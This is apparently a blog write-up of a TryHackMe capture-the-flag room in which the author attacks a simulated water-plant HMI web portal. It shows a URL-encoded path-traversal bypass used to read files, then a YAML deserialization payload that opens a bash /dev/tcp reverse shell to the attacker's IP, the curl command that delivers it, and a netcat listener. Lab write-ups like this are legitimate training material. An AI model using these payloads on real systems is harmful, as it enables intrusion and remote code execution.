---
layout: post
title: "Persistence Tryhackme"
date: 2025-06-28
categories: [blog, cybersecurity]
tags: [Redteam, pentesting, bugbounty, ctf]
image: https://t3.ftcdn.net/jpg/12/35/16/60/360_F_1235166046_hwjPQ4tazm67h8oblqp2Ec9UtDdUguas.jpg
permalink: /blog/PersistenceTryhackme/
---

<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
  <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
    Challenge: Persistence
  </div>
  <div style="margin-bottom: 12px;">
    <strong>Description:</strong><br>
    After the notorious malware strike on the Virelia Water Control Facility, phantom alerts and erratic sensor readings plague a system that was supposed to be fully remediated.

As a Black Echo red-team specialist, you must penetrate the compromised portal, unravel its hidden persistence mechanism, and neutralise the backdoor before it can be reactivated.<br>
  </div>
</div>

### Initial Recon: Nmap Sweep
We begin with a basic Nmap scan to surface any open services:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
nmap -sV -p- 10.10.75.44
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*_7ciOXzoVymtdZua4LaQjw.png"
  alt="No Detection"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

**Findings**:

-   Port 22 -- OpenSSH

-   Port 80 -- HTTP (redirects to 8080)

-   Port 8080 -- Custom Web HMI portal

Navigating to `http://10.10.75.44:8080` reveals a fairly minimal HTML interface called **HMI Dashboard**.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NUVDVXGc7fRJQ9rLCyVnnA.png"
  alt="No Detection"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

### Web Enumeration & Source Analysis

The homepage lists a few key paths:

-   `/dashboard`

-   `/telemetry`

-   `/logs/view?name=debug.log`

-   `/config/update`

We go straight to `debug.log` and find juicy internal debug info:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
STARTUP CONFIG: {'SIGNATURE': 'secr3tFTW192d2390', 'PLCS': [...], 'SENSORS': [...]}
DEBUG: loader script at /opt/hmi/update.py
DEBUG: webapp script at /opt/hmi/app.py
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*NKTpDKWmYDmeY8Dv950e6A.png"
  alt="No Detection"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

That `SIGNATURE` value feels special. We store it.

### Config Upload Endpoint Analysis

Next, we investigate the `/config/update` endpoint which appears to accept YAML file uploads. This looks promising for potential configuration manipulation.

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
SIGNATURE: secr3tFTW192d2390
PLCS:
  - id: PLC-101
    ip: 192.168.10.11
  - id: PLC-102
    ip: 192.168.10.12
SENSORS:
  - name: FlowRate
    unit: L/s
  - name: Pressure
    unit: bar
</code></pre>
</div>

Using the signature key `secr3tFTW192d2390` we discovered earlier, I attempted various approaches to authenticate the upload:

1. **YAML Content Authentication** - Embedding the signature within the YAML file
2. **HTTP Header Authentication** - Sending the signature via custom headers like `X-Signature` or `Authorization`
3. **Form Data Authentication** - Including the signature as additional form parameters

Unfortunately, all attempts resulted in **403 Forbidden** responses, indicating that simply having the signature key isn't sufficient for authentication. The endpoint appears to have additional security measures or a different authentication mechanism that we haven't uncovered yet.

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*YT7FsR5nV7CNpTgvnezheg.png"
  alt="403 Forbidden Response"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

This suggests we need to dig deeper into the application's authentication logic or find alternative attack vectors.

### Local File Inclusion Discovery

With the config upload endpoint blocked, I shifted focus back to the logs endpoint for parameter enumeration. I started with directory fuzzing using ffuf:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
ffuf -u "http://10.10.75.44:8080/logs/view?name=FUZZ.log" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200
</code></pre>
</div>

The fuzzing didn't reveal additional log files, so I pivoted to testing for Local File Inclusion (LFI). Standard path traversal payloads like `../../../../../etc/passwd` were blocked, but the application's error messages revealed crucial information about its filtering logic.

#### Error Message Analysis - The Key to Understanding Filters

Testing different payloads exposed interesting behavioral differences in the application's responses:

**Test Case 1:**

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
/logs/view?name=app.py -> "log not found"
</code></pre>
</div>

**Test Case 2:**

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
/logs/view?name=../../../../update.py -> "no logs found"
</code></pre>
</div>

This isn't just a difference in wording it reveals the underlying application logic:

- **"log not found"** indicates the application looked for `app.py` in the legitimate logs directory but couldn't find it. The filename format was accepted as valid.

- **"no logs found"** indicates the path traversal attempt was detected and blocked/sanitized before file system access was attempted.

#### URL Encoding Bypass

Based on this analysis, I suspected the application was filtering forward slashes (`/`) in the path traversal. Testing with URL-encoded slashes (`%2f`) confirmed this theory:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
curl "http://10.10.75.44:8080/logs/view?name=../../../../../etc/passwd"
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*sKaBlbeGO0yh6tIb6b059A.png"
  alt="403 Forbidden Response"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
curl "http://10.10.75.44:8080/logs/view?name=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*FjrjdYnUUbnB6C5DgpK93Q.png"
  alt="403 Forbidden Response"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Success! The URL encoding bypass allowed me to read `/etc/passwd`, confirming LFI vulnerability.

### Source Code Analysis

Now that we have confirmed LFI, let's examine the application's source code. Remember from the debug logs, we identified two critical files:

- **Loader script**: `/opt/hmi/update.py`
- **Web application**: `/opt/hmi/app.py`

Using our URL encoding bypass technique, let's retrieve these files:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
# Read the update.py loader script
curl "http://10.10.75.44:8080/logs/view?name=..%2f..%2f..%2f..%2f..%2fopt%2fhmi%2fupdate.py"
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*obt4HhdEjFT8d4oKqyz3WA.png"
  alt="No Detection"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
# Read the app.py web application
curl "http://10.10.75.44:8080/logs/view?name=..%2f..%2f..%2f..%2f..%2fopt%2fhmi%2fapp.py"
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*gXsmdikDIC3_vYtuVhodtQ.png"
  alt="No Detection"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

Key juicy bits:
---------------

### 1. **Signature check on POST /config/update**

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
sig = request.headers.get('X-FTW','')
if sig != app_config['SIGNATURE']:
    return 'Forbidden', 403
</code></pre>
</div>

-   Your POST to `/config/update` **must include header `X-FTW` with the exact signature** from the config (like `secr3tFTW192d2390`)

-   If it doesn't match, server spits `403 Forbidden`

### 2. **Content-Type must be exactly `application/x-yaml`**

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
if request.content_type != 'application/x-yaml':
    return 'Unsupported Media Type', 415
</code></pre>
</div>

-   Your POST must send the YAML **with header `Content-Type: application/x-yaml`** (not `application/x-www-form-urlencoded` or anything else)

### 3. **Config writing and update trigger**

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
with open(os.path.join(APP_ROOT, 'config.yaml'), 'wb') as f:
    f.write(data)
log('Configuration updated', 'app')
subprocess.Popen(['sudo', 'python3', os.path.join(APP_ROOT, 'update.py')])
</code></pre>
</div>

-   The server overwrites `/opt/hmi/config.yaml` with your raw YAML data (no sanitizing!)

-   Then asynchronously runs `sudo python3 /opt/hmi/update.py` so your malicious YAML can trigger code execution through the `UnsafeLoader` you saw earlier!

### 4. **Log viewing endpoint `/logs/view`**

-   Blocks `/` in query string to stop traversal

-   Reads logs only inside `/opt/hmi/logs`

-   If file missing or filtered, returns errors

Now with all this information, we can start to write our YAML that would let us get a reverse shell. In this case, my YAML looks like this:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
cat exploit.yaml
SIGNATURE: secr3tFTW192d2390
PLCS:
  - id: PLC-101
    ip: 192.168.10.11
  - id: PLC-102
    ip: 192.168.10.12
SENSORS:
  - name: FlowRate
    unit: L/s
  - name: Pressure
    unit: bar
BACKDOOR:
  enabled: true
  commands:
    - !!python/object/apply:os.system
      - "bash -c 'bash -i >& /dev/tcp/10.13.87.60/4444 0>&1'"
</code></pre>
</div>

And for sending the payload, I would send it like this:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
curl -X POST http://10.10.75.44:8080/config/update \                         
  -H "X-FTW: secr3tFTW192d2390" \
  -H "Content-Type: application/x-yaml" \
  --data-binary @exploit.yaml
</code></pre>
</div>

Remember to set up your listener:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
nc -lvnp 4444

listening on [any] 4444 ...
</code></pre>
</div>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*yYB6ZYvNU06Gr8Y_W_70Lg.png"
  alt="Reverse Shell Success"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

<img 
  src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*TZKx8bUQmCPtbnFwdKQdhQ.png"
  alt="Reverse Shell Success"
  class="zoomable-img"
  style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;"
/>

We got a reverse shell! Ladies and gentlemen, we're in!

Now to find the flag, we execute this:

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
grep -r --color=always 'THM{' /opt /home /tmp /var /etc 2>/dev/null
</code></pre>
</div>

